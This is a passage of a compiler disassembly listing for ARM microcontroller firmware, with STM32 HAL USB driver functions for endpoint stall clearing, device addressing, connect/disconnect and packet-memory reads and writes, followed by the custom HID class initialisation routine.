 80084bc:	687a      	ldr	r2, [r7, #4]
 80084be:	683b      	ldr	r3, [r7, #0]
 80084c0:	781b      	ldrb	r3, [r3, #0]
 80084c2:	009b      	lsls	r3, r3, #2
 80084c4:	4413      	add	r3, r2
 80084c6:	881b      	ldrh	r3, [r3, #0]
 80084c8:	82fb      	strh	r3, [r7, #22]
 80084ca:	8afb      	ldrh	r3, [r7, #22]
 80084cc:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80084d0:	2b00      	cmp	r3, #0
 80084d2:	d01b      	beq.n	800850c <USB_EPClearStall+0x106>
 80084d4:	687a      	ldr	r2, [r7, #4]
 80084d6:	683b      	ldr	r3, [r7, #0]
 80084d8:	781b      	ldrb	r3, [r3, #0]
 80084da:	009b      	lsls	r3, r3, #2
 80084dc:	4413      	add	r3, r2
 80084de:	881b      	ldrh	r3, [r3, #0]
 80084e0:	b29b      	uxth	r3, r3
 80084e2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80084e6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80084ea:	82bb      	strh	r3, [r7, #20]
 80084ec:	687a      	ldr	r2, [r7, #4]
 80084ee:	683b      	ldr	r3, [r7, #0]
 80084f0:	781b      	ldrb	r3, [r3, #0]
 80084f2:	009b      	lsls	r3, r3, #2
 80084f4:	441a      	add	r2, r3
 80084f6:	8abb      	ldrh	r3, [r7, #20]
 80084f8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80084fc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008500:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8008504:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008508:	b29b      	uxth	r3, r3
 800850a:	8013      	strh	r3, [r2, #0]

      /* Configure VALID status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800850c:	687a      	ldr	r2, [r7, #4]
 800850e:	683b      	ldr	r3, [r7, #0]
 8008510:	781b      	ldrb	r3, [r3, #0]
 8008512:	009b      	lsls	r3, r3, #2
 8008514:	4413      	add	r3, r2
 8008516:	881b      	ldrh	r3, [r3, #0]
 8008518:	b29b      	uxth	r3, r3
 800851a:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800851e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008522:	827b      	strh	r3, [r7, #18]
 8008524:	8a7b      	ldrh	r3, [r7, #18]
 8008526:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800852a:	827b      	strh	r3, [r7, #18]
 800852c:	8a7b      	ldrh	r3, [r7, #18]
 800852e:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8008532:	827b      	strh	r3, [r7, #18]
 8008534:	687a      	ldr	r2, [r7, #4]
 8008536:	683b      	ldr	r3, [r7, #0]
 8008538:	781b      	ldrb	r3, [r3, #0]
 800853a:	009b      	lsls	r3, r3, #2
 800853c:	441a      	add	r2, r3
 800853e:	8a7b      	ldrh	r3, [r7, #18]
 8008540:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008544:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008548:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800854c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008550:	b29b      	uxth	r3, r3
 8008552:	8013      	strh	r3, [r2, #0]
    }
  }

  return HAL_OK;
 8008554:	2300      	movs	r3, #0
}
 8008556:	4618      	mov	r0, r3
 8008558:	371c      	adds	r7, #28
 800855a:	46bd      	mov	sp, r7
 800855c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008560:	4770      	bx	lr

08008562 <USB_SetDevAddress>:
  * @param  address new device address to be assigned
  *          This parameter can be a value from 0 to 255
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_SetDevAddress(USB_TypeDef *USBx, uint8_t address)
{
 8008562:	b480      	push	{r7}
 8008564:	b083      	sub	sp, #12
 8008566:	af00      	add	r7, sp, #0
 8008568:	6078      	str	r0, [r7, #4]
 800856a:	460b      	mov	r3, r1
 800856c:	70fb      	strb	r3, [r7, #3]
  if (address == 0U)
 800856e:	78fb      	ldrb	r3, [r7, #3]
 8008570:	2b00      	cmp	r3, #0
 8008572:	d103      	bne.n	800857c <USB_SetDevAddress+0x1a>
  {
    /* set device address and enable function */
    USBx->DADDR = (uint16_t)USB_DADDR_EF;
 8008574:	687b      	ldr	r3, [r7, #4]
 8008576:	2280      	movs	r2, #128	; 0x80
 8008578:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
  }

  return HAL_OK;
 800857c:	2300      	movs	r3, #0
}
 800857e:	4618      	mov	r0, r3
 8008580:	370c      	adds	r7, #12
 8008582:	46bd      	mov	sp, r7
 8008584:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008588:	4770      	bx	lr

0800858a <USB_DevConnect>:
  * @brief  USB_DevConnect Connect the USB device by enabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevConnect(USB_TypeDef *USBx)
{
 800858a:	b480      	push	{r7}
 800858c:	b083      	sub	sp, #12
 800858e:	af00      	add	r7, sp, #0
 8008590:	6078      	str	r0, [r7, #4]
  /* Enabling DP Pull-UP bit to Connect internal PU resistor on USB DP line */
  USBx->BCDR |= (uint16_t)USB_BCDR_DPPU;
 8008592:	687b      	ldr	r3, [r7, #4]
 8008594:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 8008598:	b29b      	uxth	r3, r3
 800859a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800859e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80085a2:	b29a      	uxth	r2, r3
 80085a4:	687b      	ldr	r3, [r7, #4]
 80085a6:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 80085aa:	2300      	movs	r3, #0
}
 80085ac:	4618      	mov	r0, r3
 80085ae:	370c      	adds	r7, #12
 80085b0:	46bd      	mov	sp, r7
 80085b2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80085b6:	4770      	bx	lr

080085b8 <USB_DevDisconnect>:
  * @brief  USB_DevDisconnect Disconnect the USB device by disabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevDisconnect(USB_TypeDef *USBx)
{
 80085b8:	b480      	push	{r7}
 80085ba:	b083      	sub	sp, #12
 80085bc:	af00      	add	r7, sp, #0
 80085be:	6078      	str	r0, [r7, #4]
  /* Disable DP Pull-Up bit to disconnect the Internal PU resistor on USB DP line */
  USBx->BCDR &= (uint16_t)(~(USB_BCDR_DPPU));
 80085c0:	687b      	ldr	r3, [r7, #4]
 80085c2:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 80085c6:	b29b      	uxth	r3, r3
 80085c8:	f3c3 030e 	ubfx	r3, r3, #0, #15
 80085cc:	b29a      	uxth	r2, r3
 80085ce:	687b      	ldr	r3, [r7, #4]
 80085d0:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 80085d4:	2300      	movs	r3, #0
}
 80085d6:	4618      	mov	r0, r3
 80085d8:	370c      	adds	r7, #12
 80085da:	46bd      	mov	sp, r7
 80085dc:	f85d 7b04 	ldr.w	r7, [sp], #4
 80085e0:	4770      	bx	lr

080085e2 <USB_ReadInterrupts>:
  * @brief  USB_ReadInterrupts return the global USB interrupt status
  * @param  USBx Selected device
  * @retval USB Global Interrupt status
  */
uint32_t USB_ReadInterrupts(USB_TypeDef const *USBx)
{
 80085e2:	b480      	push	{r7}
 80085e4:	b085      	sub	sp, #20
 80085e6:	af00      	add	r7, sp, #0
 80085e8:	6078      	str	r0, [r7, #4]
  uint32_t tmpreg;

  tmpreg = USBx->ISTR;
 80085ea:	687b      	ldr	r3, [r7, #4]
 80085ec:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80085f0:	b29b      	uxth	r3, r3
 80085f2:	60fb      	str	r3, [r7, #12]
  return tmpreg;
 80085f4:	68fb      	ldr	r3, [r7, #12]
}
 80085f6:	4618      	mov	r0, r3
 80085f8:	3714      	adds	r7, #20
 80085fa:	46bd      	mov	sp, r7
 80085fc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008600:	4770      	bx	lr

08008602 <USB_EP0_OutStart>:
  * @param  USBx Selected device
  * @param  psetup pointer to setup packet
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EP0_OutStart(USB_TypeDef *USBx, uint8_t *psetup)
{
 8008602:	b480      	push	{r7}
 8008604:	b083      	sub	sp, #12
 8008606:	af00      	add	r7, sp, #0
 8008608:	6078      	str	r0, [r7, #4]
 800860a:	6039      	str	r1, [r7, #0]
  UNUSED(psetup);
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 800860c:	2300      	movs	r3, #0
}
 800860e:	4618      	mov	r0, r3
 8008610:	370c      	adds	r7, #12
 8008612:	46bd      	mov	sp, r7
 8008614:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008618:	4770      	bx	lr

0800861a <USB_WritePMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_WritePMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 800861a:	b480      	push	{r7}
 800861c:	b08b      	sub	sp, #44	; 0x2c
 800861e:	af00      	add	r7, sp, #0
 8008620:	60f8      	str	r0, [r7, #12]
 8008622:	60b9      	str	r1, [r7, #8]
 8008624:	4611      	mov	r1, r2
 8008626:	461a      	mov	r2, r3
 8008628:	460b      	mov	r3, r1
 800862a:	80fb      	strh	r3, [r7, #6]
 800862c:	4613      	mov	r3, r2
 800862e:	80bb      	strh	r3, [r7, #4]
  uint32_t n = ((uint32_t)wNBytes + 1U) >> 1;
 8008630:	88bb      	ldrh	r3, [r7, #4]
 8008632:	3301      	adds	r3, #1
 8008634:	085b      	lsrs	r3, r3, #1
 8008636:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 8008638:	68fb      	ldr	r3, [r7, #12]
 800863a:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint16_t WrVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 800863c:	68bb      	ldr	r3, [r7, #8]
 800863e:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 8008640:	88fa      	ldrh	r2, [r7, #6]
 8008642:	697b      	ldr	r3, [r7, #20]
 8008644:	4413      	add	r3, r2
 8008646:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 800864a:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 800864c:	69bb      	ldr	r3, [r7, #24]
 800864e:	627b      	str	r3, [r7, #36]	; 0x24
 8008650:	e01b      	b.n	800868a <USB_WritePMA+0x70>
  {
    WrVal = pBuf[0];
 8008652:	69fb      	ldr	r3, [r7, #28]
 8008654:	781b      	ldrb	r3, [r3, #0]
 8008656:	827b      	strh	r3, [r7, #18]
    WrVal |= (uint16_t)pBuf[1] << 8;
 8008658:	69fb      	ldr	r3, [r7, #28]
 800865a:	3301      	adds	r3, #1
 800865c:	781b      	ldrb	r3, [r3, #0]
 800865e:	021b      	lsls	r3, r3, #8
 8008660:	b21a      	sxth	r2, r3
 8008662:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 8008666:	4313      	orrs	r3, r2
 8008668:	b21b      	sxth	r3, r3
 800866a:	827b      	strh	r3, [r7, #18]
    *pdwVal = (WrVal & 0xFFFFU);
 800866c:	6a3b      	ldr	r3, [r7, #32]
 800866e:	8a7a      	ldrh	r2, [r7, #18]
 8008670:	801a      	strh	r2, [r3, #0]
    pdwVal++;
 8008672:	6a3b      	ldr	r3, [r7, #32]
 8008674:	3302      	adds	r3, #2
 8008676:	623b      	str	r3, [r7, #32]

#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */

    pBuf++;
 8008678:	69fb      	ldr	r3, [r7, #28]
 800867a:	3301      	adds	r3, #1
 800867c:	61fb      	str	r3, [r7, #28]
    pBuf++;
 800867e:	69fb      	ldr	r3, [r7, #28]
 8008680:	3301      	adds	r3, #1
 8008682:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 8008684:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008686:	3b01      	subs	r3, #1
 8008688:	627b      	str	r3, [r7, #36]	; 0x24
 800868a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800868c:	2b00      	cmp	r3, #0
 800868e:	d1e0      	bne.n	8008652 <USB_WritePMA+0x38>
  }
}
 8008690:	bf00      	nop
 8008692:	bf00      	nop
 8008694:	372c      	adds	r7, #44	; 0x2c
 8008696:	46bd      	mov	sp, r7
 8008698:	f85d 7b04 	ldr.w	r7, [sp], #4
 800869c:	4770      	bx	lr

0800869e <USB_ReadPMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_ReadPMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 800869e:	b480      	push	{r7}
 80086a0:	b08b      	sub	sp, #44	; 0x2c
 80086a2:	af00      	add	r7, sp, #0
 80086a4:	60f8      	str	r0, [r7, #12]
 80086a6:	60b9      	str	r1, [r7, #8]
 80086a8:	4611      	mov	r1, r2
 80086aa:	461a      	mov	r2, r3
 80086ac:	460b      	mov	r3, r1
 80086ae:	80fb      	strh	r3, [r7, #6]
 80086b0:	4613      	mov	r3, r2
 80086b2:	80bb      	strh	r3, [r7, #4]
  uint32_t n = (uint32_t)wNBytes >> 1;
 80086b4:	88bb      	ldrh	r3, [r7, #4]
 80086b6:	085b      	lsrs	r3, r3, #1
 80086b8:	b29b      	uxth	r3, r3
 80086ba:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 80086bc:	68fb      	ldr	r3, [r7, #12]
 80086be:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint32_t RdVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 80086c0:	68bb      	ldr	r3, [r7, #8]
 80086c2:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 80086c4:	88fa      	ldrh	r2, [r7, #6]
 80086c6:	697b      	ldr	r3, [r7, #20]
 80086c8:	4413      	add	r3, r2
 80086ca:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80086ce:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 80086d0:	69bb      	ldr	r3, [r7, #24]
 80086d2:	627b      	str	r3, [r7, #36]	; 0x24
 80086d4:	e018      	b.n	8008708 <USB_ReadPMA+0x6a>
  {
    RdVal = *(__IO uint16_t *)pdwVal;
 80086d6:	6a3b      	ldr	r3, [r7, #32]
 80086d8:	881b      	ldrh	r3, [r3, #0]
 80086da:	b29b      	uxth	r3, r3
 80086dc:	613b      	str	r3, [r7, #16]
    pdwVal++;
 80086de:	6a3b      	ldr	r3, [r7, #32]
 80086e0:	3302      	adds	r3, #2
 80086e2:	623b      	str	r3, [r7, #32]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 80086e4:	693b      	ldr	r3, [r7, #16]
 80086e6:	b2da      	uxtb	r2, r3
 80086e8:	69fb      	ldr	r3, [r7, #28]
 80086ea:	701a      	strb	r2, [r3, #0]
    pBuf++;
 80086ec:	69fb      	ldr	r3, [r7, #28]
 80086ee:	3301      	adds	r3, #1
 80086f0:	61fb      	str	r3, [r7, #28]
    *pBuf = (uint8_t)((RdVal >> 8) & 0xFFU);
 80086f2:	693b      	ldr	r3, [r7, #16]
 80086f4:	0a1b      	lsrs	r3, r3, #8
 80086f6:	b2da      	uxtb	r2, r3
 80086f8:	69fb      	ldr	r3, [r7, #28]
 80086fa:	701a      	strb	r2, [r3, #0]
    pBuf++;
 80086fc:	69fb      	ldr	r3, [r7, #28]
 80086fe:	3301      	adds	r3, #1
 8008700:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 8008702:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008704:	3b01      	subs	r3, #1
 8008706:	627b      	str	r3, [r7, #36]	; 0x24
 8008708:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800870a:	2b00      	cmp	r3, #0
 800870c:	d1e3      	bne.n	80086d6 <USB_ReadPMA+0x38>
#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */
  }

  if ((wNBytes % 2U) != 0U)
 800870e:	88bb      	ldrh	r3, [r7, #4]
 8008710:	f003 0301 	and.w	r3, r3, #1
 8008714:	b29b      	uxth	r3, r3
 8008716:	2b00      	cmp	r3, #0
 8008718:	d007      	beq.n	800872a <USB_ReadPMA+0x8c>
  {
    RdVal = *pdwVal;
 800871a:	6a3b      	ldr	r3, [r7, #32]
 800871c:	881b      	ldrh	r3, [r3, #0]
 800871e:	b29b      	uxth	r3, r3
 8008720:	613b      	str	r3, [r7, #16]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 8008722:	693b      	ldr	r3, [r7, #16]
 8008724:	b2da      	uxtb	r2, r3
 8008726:	69fb      	ldr	r3, [r7, #28]
 8008728:	701a      	strb	r2, [r3, #0]
  }
}
 800872a:	bf00      	nop
 800872c:	372c      	adds	r7, #44	; 0x2c
 800872e:	46bd      	mov	sp, r7
 8008730:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008734:	4770      	bx	lr
	...

08008738 <USBD_CUSTOM_HID_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008738:	b580      	push	{r7, lr}
 800873a:	b084      	sub	sp, #16
 800873c:	af00      	add	r7, sp, #0
 800873e:	6078      	str	r0, [r7, #4]
 8008740:	460b      	mov	r3, r1
 8008742:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)USBD_malloc(sizeof(USBD_CUSTOM_HID_HandleTypeDef));
 8008744:	2024      	movs	r0, #36	; 0x24
 8008746:	f004 fd05 	bl	800d154 <USBD_static_malloc>
 800874a:	60f8      	str	r0, [r7, #12]

  if (hhid == NULL)
 800874c:	68fb      	ldr	r3, [r7, #12]
 800874e:	2b00      	cmp	r3, #0
 8008750:	d109      	bne.n	8008766 <USBD_CUSTOM_HID_Init+0x2e>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008752:	687b      	ldr	r3, [r7, #4]
 8008754:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008758:	687b      	ldr	r3, [r7, #4]
 800875a:	32b0      	adds	r2, #176	; 0xb0
 800875c:	2100      	movs	r1, #0
 800875e:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 8008762:	2302      	movs	r3, #2
 8008764:	e08b      	b.n	800887e <USBD_CUSTOM_HID_Init+0x146>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hhid;
 8008766:	687b      	ldr	r3, [r7, #4]
 8008768:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800876c:	687b      	ldr	r3, [r7, #4]
 800876e:	32b0      	adds	r2, #176	; 0xb0
 8008770:	68f9      	ldr	r1, [r7, #12]
 8008772:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 8008776:	687b      	ldr	r3, [r7, #4]
 8008778:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800877c:	687b      	ldr	r3, [r7, #4]
 800877e:	32b0      	adds	r2, #176	; 0xb0
 8008780:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008784:	687b      	ldr	r3, [r7, #4]
 8008786:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 800878a:	687b      	ldr	r3, [r7, #4]
 800878c:	7c1b      	ldrb	r3, [r3, #16]
 800878e:	2b00      	cmp	r3, #0
 8008790:	d11b      	bne.n	80087ca <USBD_CUSTOM_HID_Init+0x92>
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008792:	4b3d      	ldr	r3, [pc, #244]	; (8008888 <USBD_CUSTOM_HID_Init+0x150>)
 8008794:	781b      	ldrb	r3, [r3, #0]
 8008796:	f003 020f 	and.w	r2, r3, #15
 800879a:	6879      	ldr	r1, [r7, #4]
 800879c:	4613      	mov	r3, r2
 800879e:	009b      	lsls	r3, r3, #2
 80087a0:	4413      	add	r3, r2
 80087a2:	009b      	lsls	r3, r3, #2
 80087a4:	440b      	add	r3, r1
 80087a6:	3326      	adds	r3, #38	; 0x26
 80087a8:	2205      	movs	r2, #5
 80087aa:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 80087ac:	4b37      	ldr	r3, [pc, #220]	; (800888c <USBD_CUSTOM_HID_Init+0x154>)
 80087ae:	781b      	ldrb	r3, [r3, #0]
 80087b0:	f003 020f 	and.w	r2, r3, #15
 80087b4:	6879      	ldr	r1, [r7, #4]
 80087b6:	4613      	mov	r3, r2
 80087b8:	009b      	lsls	r3, r3, #2
 80087ba:	4413      	add	r3, r2
 80087bc:	009b      	lsls	r3, r3, #2
 80087be:	440b      	add	r3, r1
 80087c0:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 80087c4:	2205      	movs	r2, #5
 80087c6:	801a      	strh	r2, [r3, #0]
 80087c8:	e01a      	b.n	8008800 <USBD_CUSTOM_HID_Init+0xc8>
  }
  else   /* LOW and FULL-speed endpoints */
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 80087ca:	4b2f      	ldr	r3, [pc, #188]	; (8008888 <USBD_CUSTOM_HID_Init+0x150>)
 80087cc:	781b      	ldrb	r3, [r3, #0]
 80087ce:	f003 020f 	and.w	r2, r3, #15
 80087d2:	6879      	ldr	r1, [r7, #4]
 80087d4:	4613      	mov	r3, r2
 80087d6:	009b      	lsls	r3, r3, #2
 80087d8:	4413      	add	r3, r2
 80087da:	009b      	lsls	r3, r3, #2
 80087dc:	440b      	add	r3, r1
 80087de:	3326      	adds	r3, #38	; 0x26
 80087e0:	2205      	movs	r2, #5
 80087e2:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 80087e4:	4b29      	ldr	r3, [pc, #164]	; (800888c <USBD_CUSTOM_HID_Init+0x154>)
 80087e6:	781b      	ldrb	r3, [r3, #0]
 80087e8:	f003 020f 	and.w	r2, r3, #15
 80087ec:	6879      	ldr	r1, [r7, #4]
 80087ee:	4613      	mov	r3, r2
 80087f0:	009b      	lsls	r3, r3, #2
 80087f2:	4413      	add	r3, r2
 80087f4:	009b      	lsls	r3, r3, #2
 80087f6:	440b      	add	r3, r1
 80087f8:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 80087fc:	2205      	movs	r2, #5
 80087fe:	801a      	strh	r2, [r3, #0]
  }

  /* Open EP IN */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDInEpAdd, USBD_EP_TYPE_INTR,
 8008800:	4b21      	ldr	r3, [pc, #132]	; (8008888 <USBD_CUSTOM_HID_Init+0x150>)
 8008802:	7819      	ldrb	r1, [r3, #0]
 8008804:	2302      	movs	r3, #2
 8008806:	2203      	movs	r2, #3
 8008808:	6878      	ldr	r0, [r7, #4]
 800880a:	f004 fa6f 	bl	800ccec <USBD_LL_OpenEP>
                       CUSTOM_HID_EPIN_SIZE);

  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 1U;
 800880e:	4b1e      	ldr	r3, [pc, #120]	; (8008888 <USBD_CUSTOM_HID_Init+0x150>)
 8008810:	781b      	ldrb	r3, [r3, #0]
 8008812:	f003 020f 	and.w	r2, r3, #15
 8008816:	6879      	ldr	r1, [r7, #4]
 8008818:	4613      	mov	r3, r2
 800881a:	009b      	lsls	r3, r3, #2
 800881c:	4413      	add	r3, r2
 800881e:	009b      	lsls	r3, r3, #2
 8008820:	440b      	add	r3, r1
 8008822:	3324      	adds	r3, #36	; 0x24
 8008824:	2201      	movs	r2, #1
 8008826:	801a      	strh	r2, [r3, #0]

  /* Open EP OUT */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDOutEpAdd, USBD_EP_TYPE_INTR,
 8008828:	4b18      	ldr	r3, [pc, #96]	; (800888c <USBD_CUSTOM_HID_Init+0x154>)
 800882a:	7819      	ldrb	r1, [r3, #0]
 800882c:	2302      	movs	r3, #2
 800882e:	2203      	movs	r2, #3
 8008830:	6878      	ldr	r0, [r7, #4]
 8008832:	f004 fa5b 	bl	800ccec <USBD_LL_OpenEP>
                       CUSTOM_HID_EPOUT_SIZE);

  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 1U;
 8008836:	4b15      	ldr	r3, [pc, #84]	; (800888c <USBD_CUSTOM_HID_Init+0x154>)
 8008838:	781b      	ldrb	r3, [r3, #0]
 800883a:	f003 020f 	and.w	r2, r3, #15
 800883e:	6879      	ldr	r1, [r7, #4]
 8008840:	4613      	mov	r3, r2
 8008842:	009b      	lsls	r3, r3, #2
 8008844:	4413      	add	r3, r2
 8008846:	009b      	lsls	r3, r3, #2
 8008848:	440b      	add	r3, r1
 800884a:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800884e:	2201      	movs	r2, #1
 8008850:	801a      	strh	r2, [r3, #0]

  hhid->state = CUSTOM_HID_IDLE;
 8008852:	68fb      	ldr	r3, [r7, #12]
 8008854:	2200      	movs	r2, #0
 8008856:	f883 2020 	strb.w	r2, [r3, #32]

  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->Init();
 800885a:	687b      	ldr	r3, [r7, #4]
 800885c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008860:	687a      	ldr	r2, [r7, #4]
 8008862:	33b0      	adds	r3, #176	; 0xb0
 8008864:	009b      	lsls	r3, r3, #2
 8008866:	4413      	add	r3, r2
 8008868:	685b      	ldr	r3, [r3, #4]
 800886a:	685b      	ldr	r3, [r3, #4]
 800886c:	4798      	blx	r3

#ifndef USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED
  /* Prepare Out endpoint to receive 1st packet */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 800886e:	4b07      	ldr	r3, [pc, #28]	; (800888c <USBD_CUSTOM_HID_Init+0x154>)
 8008870:	7819      	ldrb	r1, [r3, #0]
 8008872:	68fa      	ldr	r2, [r7, #12]
 8008874:	230f      	movs	r3, #15
 8008876:	6878      	ldr	r0, [r7, #4]
 8008878:	f004 fbea 	bl	800d050 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
#endif /* USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED */

  return (uint8_t)USBD_OK;
 800887c:	2300      	movs	r3, #0
}
 800887e:	4618      	mov	r0, r3
 8008880:	3710      	adds	r7, #16
 8008882:	46bd      	mov	sp, r7
 8008884:	bd80      	pop	{r7, pc}
 8008886:	bf00      	nop
 8008888:	200000a6 	.word	0x200000a6
 800888c:	200000a7 	.word	0x200000a7

08008890 <USBD_CUSTOM_HID_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008890:	b580      	push	{r7, lr}
 8008892:	b082      	sub	sp, #8
 8008894:	af00      	add	r7, sp, #0
 8008896:	6078      	str	r0, [r7, #4]
 8008898:	460b      	mov	r3, r1
 800889a:	70fb      	strb	r3, [r7, #3]
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close CUSTOM_HID EP IN */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDInEpAdd);
 800889c:	4b37      	ldr	r3, [pc, #220]	; (800897c <USBD_CUSTOM_HID_DeInit+0xec>)
